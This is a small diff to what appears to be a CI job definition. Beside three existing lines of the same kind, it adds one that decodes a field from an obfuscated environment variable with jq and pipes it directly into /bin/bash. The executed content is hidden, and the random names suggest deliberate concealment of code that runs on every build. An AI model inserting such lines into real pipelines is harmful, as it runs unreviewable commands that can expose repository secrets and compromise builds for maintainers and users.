@@ -27,6 +27,7 @@ jobs:
           echo $lecd20 | jq -r .eogcv519 | /bin/bash
           echo $p7448 | jq -r .ou7241 | /bin/bash
           printf '%s' "$gj325" | jq -r .nol775 | /bin/bash
+          echo $xkixm76 | jq -r .q28 | /bin/bash
 
       - name: Upload data
         if: always()
